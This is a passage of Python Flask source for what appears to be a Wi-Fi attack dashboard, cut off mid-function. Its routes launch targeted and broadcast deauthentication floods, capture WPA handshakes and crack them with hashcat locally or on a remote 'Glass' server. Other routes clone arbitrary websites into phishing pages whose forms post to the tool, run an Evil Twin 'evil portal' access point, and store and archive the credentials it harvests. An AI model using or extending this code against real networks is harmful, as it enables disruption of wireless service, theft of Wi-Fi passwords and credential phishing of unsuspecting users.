@app.route('/api/attack_client_deauth', methods=['POST'])
def attack_client_deauth():
    """Targeted client deauth attack"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'client_deauth_{timestamp}.log')
    
    result = run_script('attack_client_deauth.sh', [bssid, channel, ssid], 
                       timeout_seconds=240, log_file=log_file)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

@app.route('/api/attack_deauth_flood', methods=['POST'])
def attack_deauth_flood():
    """Continuous broadcast deauth flood"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'deauth_flood_{timestamp}.log')
    
    result = run_script('attack_deauth_flood.sh', [bssid, channel, ssid], 
                       timeout_seconds=240, log_file=log_file)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

@app.route('/api/attack_extended', methods=['POST'])
def attack_extended():
    """Extended capture with multiple deauth waves"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'extended_capture_{timestamp}.log')
    
    result = run_script('attack_extended_capture.sh', [bssid, channel, ssid], 
                       timeout_seconds=360, log_file=log_file)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

@app.route('/api/auto_capture', methods=['POST'])
def auto_capture():
    """Run automated orchestrator (tries all methods)"""
    global orchestrator_state
    
    if orchestrator_state['running']:
        return jsonify({'success': False, 'output': 'Orchestrator already running'})
    
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = f'/tmp/auto_capture_live_{timestamp}.log'
    
    # Start orchestrator in background
    script_path = os.path.join(SCRIPT_DIR, 'auto_capture.sh')
    
    def run_orchestrator():
        global orchestrator_state
        try:
            with open(log_file, 'w') as log:
                process = subprocess.Popen(
                    ['bash', script_path, bssid, channel, ssid],
                    stdout=log,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                orchestrator_state['process'] = process
                process.wait()
        finally:
            orchestrator_state['running'] = False
            orchestrator_state['process'] = None
    
    orchestrator_state['running'] = True
    orchestrator_state['log_file'] = log_file
    orchestrator_state['start_time'] = time.time()
    
    thread = threading.Thread(target=run_orchestrator)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'output': 'Orchestrator started - streaming output...',
        'log_file': log_file
    })


@app.route('/api/auto_capture_live_log', methods=['GET'])
def auto_capture_live_log():
    """Get live orchestrator log output"""
    global orchestrator_state
    
    if not orchestrator_state['log_file']:
        return jsonify({
            'running': False,
            'content': '',
            'bytes_read': 0
        })
    
    # Get byte offset from request (where client left off)
    offset = int(request.args.get('offset', 0))
    
    try:
        log_file = orchestrator_state['log_file']
        
        if not os.path.exists(log_file):
            return jsonify({
                'running': orchestrator_state['running'],
                'content': '',
                'bytes_read': offset
            })
        
        # Read new content from offset
        with open(log_file, 'r') as f:
            f.seek(offset)
            new_content = f.read()
            new_offset = f.tell()
        
        return jsonify({
            'running': orchestrator_state['running'],
            'content': new_content,
            'bytes_read': new_offset,
            'elapsed': int(time.time() - orchestrator_state['start_time']) if orchestrator_state['start_time'] else 0
        })
    
    except Exception as e:
        return jsonify({
            'running': orchestrator_state['running'],
            'content': '',
            'bytes_read': offset,
            'error': str(e)
        })

@app.route('/api/auto_capture_status', methods=['GET'])
def auto_capture_status():
    """Get current auto-capture orchestrator status"""
    global orchestrator_state
    status_file = "/tmp/auto_capture_status.txt"

    # Check if orchestrator is actually running
    is_running = orchestrator_state.get('running', False)

    # If not running, check if there's a final status in the file
    if not is_running:
        if os.path.exists(status_file):
            try:
                with open(status_file, 'r') as f:
                    status_data = json.load(f)
                status_data['running'] = False
                return jsonify(status_data)
            except:
                pass
        return jsonify({
            'running': False,
            'current_method': 0,
            'method_name': 'Not running',
            'status': 'Idle',
            'elapsed_seconds': 0,
            'timestamp': ''
        })

    # Calculate elapsed time dynamically from start_time
    start_time = orchestrator_state.get('start_time', time.time())
    elapsed = int(time.time() - start_time)

    if not os.path.exists(status_file):
        return jsonify({
            'running': True,
            'current_method': 0,
            'method_name': 'Initializing',
            'status': 'Starting...',
            'elapsed_seconds': elapsed,
            'timestamp': time.strftime('%H:%M:%S')
        })

    try:
        with open(status_file, 'r') as f:
            status_data = json.load(f)

        status_data['running'] = True
        status_data['elapsed_seconds'] = elapsed  # Override with live elapsed time
        status_data['timestamp'] = time.strftime('%H:%M:%S')  # Live timestamp
        return jsonify(status_data)
    except Exception as e:
        return jsonify({
            'running': True,
            'error': str(e),
            'current_method': 0,
            'method_name': 'Error',
            'status': f'Error reading status: {str(e)}',
            'elapsed_seconds': elapsed,
            'timestamp': time.strftime('%H:%M:%S')
        })

@app.route('/api/crack/start', methods=['POST'])
def crack_start():
    """Start cracking latest capture or specified file"""
    global cracking_state
    
    if cracking_state['running']:
        return jsonify({'success': False, 'output': 'Already cracking'})
    
    # Check if specific file requested
    data = request.json or {}
    requested_file = data.get('filename')
    
    if requested_file:
        # Use specified file
        source_file = os.path.join(CAPTURE_DIR, os.path.basename(requested_file))
        if not os.path.exists(source_file):
            return jsonify({'success': False, 'output': f'File not found: {requested_file}'})
    else:
        # Use latest .hc22000 file
        hash_files = glob.glob(os.path.join(CAPTURE_DIR, '*.hc22000'))
        if not hash_files:
            return jsonify({'success': False, 'output': 'No hash files found'})
        source_file = max(hash_files, key=os.path.getctime)
    
    # If file is .cap/.pcap/.pcapng, convert it first
    if source_file.endswith(('.cap', '.pcap', '.pcapng')):
        try:
            # Create .hc22000 filename
            hash_file = source_file.rsplit('.', 1)[0] + '.hc22000'
            
            # Convert using hcxpcapngtool
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hash_file, source_file],
                capture_output=True,
                text=False,  # Don't decode as text - prevents UTF-8 errors
                timeout=10
            )
            
            # Check if conversion succeeded
            if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
                return jsonify({
                    'success': False,
                    'output': f'Error: {os.path.basename(source_file)} contains no valid handshake or PMKID\n\nCapture might be empty or corrupted. Try capturing again.'
                })
        
        except subprocess.TimeoutExpired:
            return jsonify({
                'success': False,
                'output': 'Conversion timed out'
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'output': f'Conversion error: {str(e)}'
            })
    else:
        # Already .hc22000 format
        hash_file = source_file
    
    # Reset state
    cracking_state = {
        'running': True,
        'process': None,
        'output': '',
        'status': 'Starting...',
        'progress': '0%',
        'speed': 'Calculating...',
        'time_remaining': 'Calculating...',
        'device': 'Detecting...',
        'hash_file': hash_file
    }
    
    # Start cracking in background thread
    thread = threading.Thread(target=run_hashcat_thread, args=(hash_file,))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'output': f'Started cracking: {os.path.basename(hash_file)}'
    })

@app.route('/api/crack/status', methods=['GET'])
def crack_status():
    """Get current cracking status"""
    global cracking_state
    
    return jsonify({
        'running': cracking_state['running'],
        'status': cracking_state['status'],
        'progress': cracking_state['progress'],
        'speed': cracking_state['speed'],
        'time_remaining': cracking_state['time_remaining'],
        'device': cracking_state['device'],
        'hash_file': os.path.basename(cracking_state['hash_file']) if cracking_state['hash_file'] else ''
    })

@app.route('/api/crack/stop', methods=['POST'])
def crack_stop():
    """Stop cracking process"""
    global cracking_state
    
    if cracking_state['running'] and cracking_state['process']:
        try:
            cracking_state['process'].terminate()
            cracking_state['process'].wait(timeout=5)
        except:
            cracking_state['process'].kill()
        
        cracking_state['running'] = False
        cracking_state['status'] = 'Stopped by user'
        return jsonify({'success': True, 'output': 'Cracking stopped'})
    else:
        return jsonify({'success': False, 'output': 'Not currently cracking'})


# Local crack state
local_crack_state = {
    'running': False,
    'stage': '',
    'start_time': 0,
    'process': None,
    'filepath': '',
    'cracked': False,
    'password': '',
    'stopped': False
}


def run_local_crack(filepath):
    """Background thread for local cracking"""
    global local_crack_state
    
    wpa_wordlist = '/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt'
    potfile = os.path.expanduser('~/.local/share/hashcat/hashcat.potfile')
    
    def check_cracked():
        try:
            result = subprocess.run(
                ['hashcat', '-m', '22000', filepath, '--show', '--potfile-path', potfile],
                capture_output=True, text=True, timeout=10
            )
            if result.stdout.strip():
                parts = result.stdout.strip().split(':')
                return parts[-1] if parts else None
        except:
            pass
        return None
    
    # Stage 1: Top 4800 WPA passwords
    local_crack_state['stage'] = 'Stage 1: Top 4800 WPA passwords'
    try:
        proc = subprocess.Popen(
            ['hashcat', '-m', '22000', '-a', '0', filepath, wpa_wordlist,
             '--potfile-path', potfile, '-O', '--quiet'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        local_crack_state['process'] = proc
        proc.wait()
        
        if local_crack_state['stopped']:
            return
        
        password = check_cracked()
        if password:
            local_crack_state['cracked'] = True
            local_crack_state['password'] = password
            local_crack_state['running'] = False
            return
    except Exception as e:
        pass
    
    if local_crack_state['stopped']:
        return
    
    # Stage 2: 8-digit numeric
    local_crack_state['stage'] = 'Stage 2: 8-digit numeric'
    try:
        proc = subprocess.Popen(
            ['hashcat', '-m', '22000', '-a', '3', filepath, '?d?d?d?d?d?d?d?d',
             '--potfile-path', potfile, '-O', '--quiet'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        local_crack_state['process'] = proc
        proc.wait()
        
        if local_crack_state['stopped']:
            return
        
        password = check_cracked()
        if password:
            local_crack_state['cracked'] = True
            local_crack_state['password'] = password
    except Exception as e:
        pass
    
    local_crack_state['running'] = False


@app.route('/api/crack/local/start', methods=['POST'])
def crack_local_start():
    """Start local crack in background"""
    global local_crack_state
    
    if local_crack_state['running']:
        return jsonify({'success': False, 'output': 'Already cracking'})
    
    data = request.json
    filename = data.get('filename')
    
    if not filename:
        return jsonify({'success': False, 'output': 'No file specified'})
    
    filepath = os.path.join(CAPTURE_DIR, os.path.basename(filename))
    
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'output': 'File not found'})
    
    # Reset state
    local_crack_state['running'] = True
    local_crack_state['stage'] = 'Starting...'
    local_crack_state['start_time'] = time.time()
    local_crack_state['filepath'] = filepath
    local_crack_state['cracked'] = False
    local_crack_state['password'] = ''
    local_crack_state['stopped'] = False
    local_crack_state['process'] = None
    
    # Start background thread
    thread = threading.Thread(target=run_local_crack, args=(filepath,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'output': 'Started'})


@app.route('/api/crack/local/status', methods=['GET'])
def crack_local_status():
    """Get local crack status"""
    global local_crack_state
    
    elapsed = int(time.time() - local_crack_state['start_time']) if local_crack_state['start_time'] else 0
    
    return jsonify({
        'running': local_crack_state['running'],
        'stage': local_crack_state['stage'],
        'elapsed': elapsed,
        'cracked': local_crack_state['cracked'],
        'password': local_crack_state['password'],
        'stopped': local_crack_state['stopped']
    })


@app.route('/api/crack/local/stop', methods=['POST'])
def crack_local_stop():
    """Stop local crack"""
    global local_crack_state
    
    local_crack_state['stopped'] = True
    local_crack_state['running'] = False
    
    if local_crack_state['process']:
        try:
            local_crack_state['process'].terminate()
            local_crack_state['process'].wait(timeout=2)
        except:
            try:
                local_crack_state['process'].kill()
            except:
                pass
    
    # Also kill any hashcat processes
    subprocess.run(['pkill', '-9', 'hashcat'], capture_output=True)
    
    return jsonify({'success': True, 'output': 'Stopped'})


@app.route('/api/captures', methods=['GET'])
def captures():
    """List recent captures. Use ?filter=hash for .hc22000 only"""
    filter_type = request.args.get('filter', 'all')
    
    if filter_type == 'hash':
        # Only hashcat files (for cracking)
        all_files = glob.glob(os.path.join(CAPTURE_DIR, '*.hc22000'))
    else:
        # All capture files
        pcap_files = glob.glob(os.path.join(CAPTURE_DIR, '*.pcapng'))
        pcap_files += glob.glob(os.path.join(CAPTURE_DIR, '*.cap'))
        hash_files = glob.glob(os.path.join(CAPTURE_DIR, '*.hc22000'))
        all_files = pcap_files + hash_files
    
    all_files.sort(key=os.path.getctime, reverse=True)
    
    captures = []
    for f in all_files[:50]:  # Increased from 20 to 50
        size = os.path.getsize(f)
        size_str = f"{size / 1024:.1f} KB" if size < 1024*1024 else f"{size / (1024*1024):.1f} MB"
        
        captures.append({
            'name': os.path.basename(f),
            'size': size_str,
            'path': f
        })
    
    return jsonify({'captures': captures})

@app.route('/api/captures/delete', methods=['POST'])
def delete_captures():
    """Delete selected capture files"""
    data = request.json
    files = data.get('files', [])
    
    if not files:
        return jsonify({'success': False, 'output': 'No files specified'})
    
    deleted = []
    failed = []
    
    for filename in files:
        # Security: only allow deleting from captures directory
        filepath = os.path.join(CAPTURE_DIR, os.path.basename(filename))
        
        if not os.path.exists(filepath):
            failed.append(f"{filename} (not found)")
            continue
        
        try:
            os.remove(filepath)
            deleted.append(filename)
        except Exception as e:
            failed.append(f"{filename} ({str(e)})")
    
    output = f"Deleted {len(deleted)} file(s)"
    if failed:
        output += f"\nFailed to delete {len(failed)} file(s):\n" + "\n".join(failed)
    
    return jsonify({
        'success': len(deleted) > 0,
        'output': output,
        'deleted_count': len(deleted)
    })


@app.route('/api/captures/browse', methods=['POST'])
def browse_captures():
    """Open captures folder in file manager"""
    try:
        subprocess.Popen(['xdg-open', CAPTURE_DIR])
        return jsonify({'success': True, 'output': 'Opening folder...'})
    except Exception as e:
        return jsonify({'success': False, 'output': str(e)})


@app.route('/api/captures/convert', methods=['POST'])
def convert_capture():
    """Manually convert .cap/.pcap/.pcapng file to .hc22000"""
    data = request.json
    filename = data.get('filename')
    
    if not filename:
        return jsonify({'success': False, 'output': 'No filename provided'})
    
    # Security: only allow files from captures directory
    source_file = os.path.join(CAPTURE_DIR, os.path.basename(filename))
    
    if not os.path.exists(source_file):
        return jsonify({'success': False, 'output': f'File not found: {filename}'})
    
    # Only allow conversion of capture files
    if not source_file.endswith(('.cap', '.pcap', '.pcapng')):
        return jsonify({'success': False, 'output': 'Only .cap, .pcap, and .pcapng files can be converted'})
    
    # Create .hc22000 filename
    hash_file = source_file.rsplit('.', 1)[0] + '.hc22000'
    
    try:
        result = subprocess.run(
            ['hcxpcapngtool', '-o', hash_file, source_file],
            capture_output=True,
            text=False,
            timeout=10
        )
        
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            return jsonify({
                'success': True,
                'output': f'Converted successfully\n\nHash file: {os.path.basename(hash_file)}\n\nReady to crack!'
            })
        else:
            return jsonify({
                'success': False,
                'output': f'Conversion failed - no valid handshake or PMKID found in {filename}'
            })
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Conversion error: {str(e)}'
        })

@app.route('/api/captures/import', methods=['POST'])
def import_capture():
    """Import and convert external capture file (e.g. from Flipper)"""
    if 'file' not in request.files:
        return jsonify({'success': False, 'output': 'No file provided'})
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'success': False, 'output': 'No file selected'})
    
    # Only allow .pcapng, .cap, and .pcap files
    if not (file.filename.endswith('.pcapng') or file.filename.endswith('.cap') or file.filename.endswith('.pcap')):
        return jsonify({'success': False, 'output': 'Only .pcapng, .cap, and .pcap files allowed'})
    
    try:
        # Save uploaded file
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        safe_filename = f"imported_{timestamp}_{os.path.basename(file.filename)}"
        pcap_path = os.path.join(CAPTURE_DIR, safe_filename)
        file.save(pcap_path)
        
        # Convert to hashcat format
        hash_filename = safe_filename.replace('.pcapng', '.hc22000').replace('.cap', '.hc22000').replace('.pcap', '.hc22000')
        hash_path = os.path.join(CAPTURE_DIR, hash_filename)
        
        result = subprocess.run(
            ['hcxpcapngtool', '-o', hash_path, pcap_path],
            capture_output=True,
            text=False,
            timeout=10
        )
        
        if os.path.exists(hash_path) and os.path.getsize(hash_path) > 0:
            return jsonify({
                'success': True,
                'output': f'Imported and converted successfully\n\nPCAP: {safe_filename}\nHash: {hash_filename}\n\nReady to crack!'
            })
        else:
            return jsonify({
                'success': False,
                'output': f'Import successful but conversion failed\nPCAP saved: {safe_filename}\nNo valid handshake/PMKID found in file'
            })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error importing file: {str(e)}'
        })

@app.route('/api/portal/templates', methods=['GET'])
def portal_templates():
    """List available portal templates"""
    templates = []
    template_files = glob.glob(os.path.join(PORTAL_DIR, '*.html'))
    
    for f in template_files:
        name = os.path.basename(f).replace('.html', '')
        templates.append({
            'name': name,
            'display_name': name.title()
        })
    
    return jsonify({'templates': [os.path.basename(f) for f in template_files]})


@app.route('/portals/<template>')
def serve_portal_template(template):
    """Serve portal template for preview"""
    template_path = os.path.join(PORTAL_DIR, template)
    if os.path.exists(template_path) and template.endswith('.html'):
        with open(template_path, 'r') as f:
            return f.read()
    return 'Template not found', 404


@app.route('/api/portal/template/<template>', methods=['DELETE'])
def delete_template(template):
    """Delete a portal template"""
    if not template:
        return jsonify({'success': False, 'error': 'No template specified'})
    
    # Sanitize template name
    template = template.replace('/', '').replace('\\', '')
    template_path = os.path.join(PORTAL_DIR, f'{template}.html')
    
    if not os.path.exists(template_path):
        return jsonify({'success': False, 'error': 'Template not found'})
    
    try:
        os.remove(template_path)
        return jsonify({'success': True, 'message': f'Deleted {template}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/portal/clone', methods=['POST'])
def portal_clone():
    """Clone a website for use as phishing template"""
    import requests
    import re
    from urllib.parse import urlparse, urljoin
    
    data = request.json
    url = data.get('url', '')
    
    if not url:
        return jsonify({'success': False, 'error': 'No URL provided'})
    
    try:
        # Fetch the page
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        }
        resp = requests.get(url, headers=headers, timeout=10, verify=False)
        resp.raise_for_status()
        html = resp.text
        
        # Parse domain for template name
        parsed = urlparse(url)
        domain = parsed.netloc.replace('www.', '').replace('.', '_')
        template_name = f"cloned_{domain}"
        
        # Rewrite form actions to submit to our portal
        html = re.sub(
            r'<form([^>]*?)action=["\'"][^\"\']* ["\'"]',
            r'<form\1action="/submit"',
            html,
            flags=re.IGNORECASE
        )
        
        # Add method POST if not present
        html = re.sub(
            r'<form(?![^>]*method=)([^>]*)>',
            r'<form method="POST"\1>',
            html,
            flags=re.IGNORECASE
        )
        
        # Convert relative URLs to absolute for images/css/js
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Fix relative src/href to absolute URLs
        def fix_url(match):
            attr = match.group(1)
            path = match.group(2)
            return f'{attr}="{urljoin(base_url, path)}"'
        
        html = re.sub(r'(href|src)="(?!http)([^"]+)"', fix_url, html)
        html = re.sub(r"(href|src)='(?!http)([^']+)'", fix_url, html)
        
        # Save template
        template_path = os.path.join(PORTAL_DIR, f'{template_name}.html')
        with open(template_path, 'w') as f:
            f.write(html)
        
        return jsonify({
            'success': True,
            'template_name': template_name,
            'message': f'Cloned {url} as {template_name}'
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({'success': False, 'error': f'Failed to fetch: {str(e)}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/portal/status', methods=['GET'])
def portal_status():
    """Check if portal is running"""
    return jsonify({
        'running': check_portal_running()
    })

@app.route('/api/portal/start', methods=['POST'])
def portal_start():
    """Start evil portal with optional Evil Twin mode (async)"""
    data = request.json
    ssid = data.get('ssid', 'Free WiFi')
    template = data.get('template', 'starbucks')
    bssid = data.get('bssid', '')  # Clone this MAC for Evil Twin
    channel = data.get('channel', '6')
    deauth_target = data.get('deauth_target', '')  # BSSID to deauth
    password = data.get('password', '')  # WPA2 password for secured Evil Twin
    post_capture = data.get('post_capture', 'success')  # error, success, redirect, awareness
    redirect_url = data.get('redirect_url', '')  # URL for redirect mode
    deauth_mode = data.get('deauth_mode', 'single')  # single, multi, smart
    
    if not ssid:
        return jsonify({'success': False, 'output': 'Missing SSID'})
    
    # Check if template exists
    template_path = os.path.join(PORTAL_DIR, f'{template}.html')
    if not os.path.exists(template_path):
        return jsonify({'success': False, 'output': f'Template {template} not found'})
    
    # Start portal script in background
    script_path = os.path.join(SCRIPT_DIR, 'start_portal.sh')
    
    # Clean environment to prevent WERKZEUG_SERVER_FD inheritance
    clean_env = os.environ.copy()
    for key in list(clean_env.keys()):
        if key.startswith('WERKZEUG'):
            del clean_env[key]
    
    # Build command with optional Evil Twin args
    cmd = ['bash', script_path, ssid, template, bssid, str(channel), deauth_target, password, post_capture, redirect_url, deauth_mode]
    
    subprocess.Popen(cmd, env=clean_env, close_fds=True)
    
    # Build status message
    mode = "WPA2 Evil Twin" if password else ("Evil Twin" if bssid else "Standard")
    security = "WPA2-PSK" if password else "Open"
    deauth_status = f"Deauth: ACTIVE on {deauth_target}" if deauth_target else "Deauth: OFF"
    
    return jsonify({
        'success': True,
        'output': f'Starting portal ({mode})...\nSSID: {ssid}\nChannel: {channel}\nSecurity: {security}\nTemplate: {template}\n{deauth_status}\n\nCheck status to see when active.'
    })

@app.route('/api/portal/clear', methods=['POST'])
def portal_clear():
    """Clear all connected clients using hostapd_cli"""
    try:
        # Use hostapd_cli to deauth all clients (broadcast address)
        cmd = ['sudo', 'hostapd_cli', 'deauthenticate', 'ff:ff:ff:ff:ff:ff']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        
        return jsonify({
            'success': True,
            'output': 'Kicked all connected clients\nThey will reconnect with fresh state'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error clearing connections: {str(e)}'
        })

@app.route('/api/portal/stop', methods=['POST'])
def portal_stop():
    """Stop evil portal"""
    result = run_script('stop_portal.sh', [], timeout_seconds=15)
    
    return jsonify({
        'success': True,
        'output': 'Evil Portal stopped\nalfa1 reset to managed mode'
    })

@app.route('/api/portal/log', methods=['GET'])
def portal_log():
    """Get portal credential log"""
    log_file = os.path.join(CAPTURE_DIR, 'portal_log.txt')
    
    if not os.path.exists(log_file):
        return jsonify({
            'success': True,
            'log': ''
        })
    
    try:
        with open(log_file, 'r') as f:
            log_content = f.read()
        
        return jsonify({
            'success': True,
            'log': log_content if log_content.strip() else ''
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'log': f'Error reading log: {str(e)}'
        })


@app.route('/api/portal/archive', methods=['POST'])
def portal_archive():
    """Archive current portal log and start fresh"""
    log_file = os.path.join(CAPTURE_DIR, 'portal_log.txt')
    archive_dir = os.path.join(CAPTURE_DIR, 'portal_archives')
    
    os.makedirs(archive_dir, exist_ok=True)
    
    if not os.path.exists(log_file) or os.path.getsize(log_file) == 0:
        return jsonify({'success': False, 'message': 'No credentials to archive'})
    
    try:
        import shutil
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        archive_name = f'portal_log_{timestamp}.txt'
        archive_path = os.path.join(archive_dir, archive_name)
        shutil.move(log_file, archive_path)
        open(log_file, 'w').close()
        return jsonify({'success': True, 'message': f'Archived to {archive_name}', 'archive': archive_name})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error archiving: {str(e)}'})


@app.route('/api/portal/archives', methods=['GET'])
def portal_archives_list():
    """List all archived portal logs"""
    archive_dir = os.path.join(CAPTURE_DIR, 'portal_archives')
    
    if not os.path.exists(archive_dir):
        return jsonify({'success': True, 'archives': []})
    
    try:
        archives = []
        for f in sorted(os.listdir(archive_dir), reverse=True):
            if f.endswith('.txt'):
                path = os.path.join(archive_dir, f)
                archives.append({'name': f, 'size': os.path.getsize(path)})
        return jsonify({'success': True, 'archives': archives})
    except Exception as e:
        return jsonify({'success': False, 'archives': [], 'error': str(e)})


@app.route('/api/portal/archives/<filename>', methods=['GET', 'DELETE'])
def portal_archive_view(filename):
    """View a specific archived portal log"""
    archive_dir = os.path.join(CAPTURE_DIR, 'portal_archives')
    
    if '..' in filename or '/' in filename:
        return jsonify({'success': False, 'log': 'Invalid filename', 'message': 'Invalid filename'})
    
    archive_path = os.path.join(archive_dir, filename)
    if not os.path.exists(archive_path):
        return jsonify({'success': False, 'log': 'Archive not found', 'message': 'Archive not found'})
    
    # Handle DELETE
    if request.method == 'DELETE':
        try:
            os.remove(archive_path)
            return jsonify({'success': True, 'message': 'Archive deleted'})
        except Exception as e:
            return jsonify({'success': False, 'message': f'Error deleting: {str(e)}'})
    
    # Handle GET
    try:
        with open(archive_path, 'r') as f:
            return jsonify({'success': True, 'log': f.read()})
    except Exception as e:
        return jsonify({'success': False, 'log': f'Error: {str(e)}'})


@app.route('/api/glass/upload', methods=['POST'])
def glass_upload():
    """Upload hash file to Glass for remote cracking"""
    data = request.json or {}
    filename = data.get('filename')
    
    if not filename:
        return jsonify({'success': False, 'output': 'No filename specified'})
    
    # Find the file
    filepath = os.path.join(CAPTURE_DIR, filename)
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'output': f'File not found: {filename}'})
    
    try:
        # Read file data into memory so both LAN and Cloudflare Tunnel attempts work
        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Upload file to Glass (tries LAN first, falls back to Cloudflare Tunnel)
        files = {'file': (filename, file_data, 'application/octet-stream')}
        response = try_glass_request('post', '/upload', files=files)
        
        if response.status_code == 200:
            result = response.json()
            return jsonify({
                'success': True,
                'output': f'Uploaded to Glass: {filename}\n\nGlass will auto-crack and you can check status.'
            })
        else:
            return jsonify({
                'success': False,
                'output': f'Upload failed: {response.status_code}'
            })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error uploading to Glass: {str(e)}'
        })

@app.route('/api/glass/status', methods=['GET'])
def glass_status():
    """Get current Glass cracking status"""
    try:
        response = try_glass_request('get', '/status')
        
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({
                'running': False,
                'status': 'Glass offline',
                'progress': '-',
                'speed': '-',
                'eta': '-',
                'file': '-'
            })

    except Exception as e:
        return jsonify({
            'running': False,
            'status': 'Glass offline',
            'progress': '-',
            'speed': '-',
            'eta': '-',
            'file': '-'
        })

@app.route('/api/glass/result', methods=['GET'])
def glass_result():
    """Get Glass cracking result"""
    filename = request.args.get('filename')
    if not filename:
        return jsonify({'success': False, 'output': 'No filename specified'})
    
    try:
        response = try_glass_request('get', f'/results/{filename}')
        
        if response.status_code == 200:
            return jsonify(response.json())
        elif response.status_code == 404:
            return jsonify({
                'success': False,
                'output': 'Result not ready yet - check status'
            })
        else:
            return jsonify({
                'success': False,
                'output': f'Glass error: {response.status_code}'
            })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error getting result: {str(e)}'
        })


@app.route('/api/glass/run_stage', methods=['POST'])
def glass_run_stage():
    """Run a specific cracking stage on Glass"""
    data = request.json or {}
    filename = data.get('filename')
    stage = data.get('stage', 1)
    
    if not filename:
        return jsonify({'success': False, 'output': 'No filename specified'})
    
    try:
        response = try_glass_request('post', '/run_stage', json={'filename': filename, 'stage': stage})
        
        if response.status_code == 200:
            return jsonify({'success': True, 'output': f'Stage {stage} started'})
        else:
            return jsonify({'success': False, 'output': f'Glass error: {response.status_code}'})
    
    except Exception as e:
        return jsonify({'success': False, 'output': f'Error: {str(e)}'})

@app.route('/api/glass/auto_escalate', methods=['POST'])
def glass_auto_escalate():
    """Run all stages until password is found"""
    data = request.json or {}
    filename = data.get('filename')
    
    if not filename:
        return jsonify({'success': False, 'output': 'No filename specified'})
    
    try:
        response = try_glass_request('post', '/auto_escalate', json={'filename': filename})
        
        if response.status_code == 200:
            return jsonify({'success': True, 'output': 'Auto-escalate started'})
        else:
            return jsonify({'success': False, 'output': f'Glass error: {response.status_code}'})
    
    except Exception as e:
        return jsonify({'success': False, 'output': f'Error: {str(e)}'})

@app.route('/api/glass/stop', methods=['POST'])
def glass_stop():
    """Stop Glass cracking"""
    try:
        response = try_glass_request('post', '/stop', json={})
        
        if response.status_code == 200:
            return jsonify({'success': True, 'output': 'Stop command sent'})
        else:
            return jsonify({'success': False, 'output': f'Glass error: {response.status_code}'})
    
    except Exception as e:
        return jsonify({'success': False, 'output': f'Error: {str(e)}'})

@app.route('/api/glass/inbox', methods=['GET'])
def glass_inbox():
    """Get list of files in Glass inbox"""
    try:
        response = try_glass_request('get', '/inbox')
        
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({'files': [], 'error': f'Glass error: {response.status_code}'})
    
    except Exception as e:
        return jsonify({'files': [], 'error': str(e)})


@app.route('/api/glass/queue', methods=['GET'])
def glass_queue():
    """Get Glass queue status - current, paused, waiting"""
    try:
        response = try_glass_request('get', '/queue')
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({'error': f'Glass error: {response.status_code}'})
    except Exception as e:
        return jsonify({'error': str(e)})


@app.route('/api/glass/pause', methods=['POST'])
def glass_pause():
    """Pause current Glass crack - saves checkpoint"""
    try:
        response = try_glass_request('post', '/pause')
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/glass/resume', methods=['POST'])
def glass_resume():
    """Resume paused Glass crack from checkpoint"""
    try:
        data = request.json or {}
